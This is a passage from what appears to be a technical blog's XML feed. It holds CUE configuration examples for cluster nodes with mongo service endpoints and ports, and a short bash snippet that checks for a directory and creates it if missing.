class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">NodeConfs: &#123;<br>  master: &#123;<br>    services: &#123;<br>        abcd: &#123;<br>            endpoints: [<br>              &#123;<br>                dns: [<span class="hljs-string">&quot;\(node.name)&quot;</span>]<br>                name: <span class="hljs-string">&quot;test&quot;</span><br>                protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>                ports: <span class="hljs-string">&quot;1234&quot;</span><br>              &#125;<br>            ]<br>        &#125;<br>    &#125;<br>  &#125;<br>  <br>&#125;<br><br><br><br><br>cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>                services: &#123;<br>                mongo :<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>                services: &#123;<br>                mongoA : &#123;<br>                 <br>                <br>                &#125;<br>                mognoB: &#123;<br>                <br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;1111&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;2222&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;1112&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;2223&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>            &#125;,<br>        ]<br>    &#125;   <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                host: <span class="hljs-string">&quot;1.1.1.1&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: [<br>                      &#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;,&#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;<br>                  ]<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                host: <span class="hljs-string">&quot;2.2.2.2&quot;</span><br>                services: &#123;<br>                    mongo : &#123;<br>                      endpoints: &#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;<br>                    &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                host: <span class="hljs-string">&quot;5.5.5.5&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;5555&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;6666&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                host: <span class="hljs-string">&quot;6.6.6.6&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;5555&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;6666&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><p>æƒ…å†µ1ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><br>cluster: &#123;<br>spec: &#123;<br>nodes: [<br>&#123;<br>name: <span class="hljs-string">&quot;m1&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>host: <span class="hljs-string">&quot;1.1.1.1&quot;</span><br>services: &#123;<br>mongo: &#123;<br>endpoints: [<br>&#123;<br>dns: [<span class="hljs-string">&quot;mongosvc1, mongosvc2&quot;</span>]<br>svcPorts: [<br>&#123;<br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>targetPort: <span class="hljs-string">&quot;1111&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>targetPort: <span class="hljs-string">&quot;2222&quot;</span><br>&#125;<br>]<br>&#125;,&#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>port: <span class="hljs-string">&quot;3333&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br>exporter : &#123;<br>endpoints: [<br>&#123;<br>dns: [<span class="hljs-string">&quot;exporter, mongosvc2&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;,&#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;3333&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;m2&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>host: <span class="hljs-string">&quot;2.2.2.2&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;n1&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>host: <span class="hljs-string">&quot;5.5.5.5&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;5555&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;6666&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;n2&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>host: <span class="hljs-string">&quot;6.6.6.6&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;5555&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;6666&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,<br>]<br>&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cue</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€shellã€‘(202305) åˆ¤æ–­æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨</title>
    <link href="/2023/05/15/shell/%E3%80%90shell%E3%80%91(202305)%20%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E5%A4%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8/"/>
    <url>/2023/05/15/shell/%E3%80%90shell%E3%80%91(202305)%20%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E5%A4%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> [ ! -d <span class="hljs-string">&quot;/root/test&quot;</span> ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> -e `<span class="hljs-built_in">date</span> <span class="hljs-string">&#x27;+%Y-%m-%d %H:%M:%S %A&#x27;</span>` <span class="hljs-string">&quot;filepath doesn&#x27;t exist &quot;</span> <br>  <span class="hljs-built_in">mkdir</span> -p /root/test<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h2 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">filePath=<span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">if</span> [ ! -d <span class="hljs-string">&quot;/root/<span class="hljs-variable">$&#123;filePath&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> -e `<span class="hljs-built_in">date</span> <span class="hljs-string">&#x27;+%Y-%m-%d %H:%M:%S %A&#x27;</span>` <span class="hljs-string">&quot;filepath doesn&#x27;t exist &quot;</span> <br>  <span class="hljs-built_in">mkdir</span> -p /root/<span class="hljs-variable">$&#123;filePath&#125;</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€è½¯è€ƒã€‘çœŸé¢˜é—®é¢˜åŠå¤ä¹ ç¬”è®°è®°å½•</title>
    <link href="/2023/05/15/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%9C%9F%E9%A2%98%E9%97%AE%E9%A2%98%E5%8F%8A%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%B0%E5%BD%95/"/>
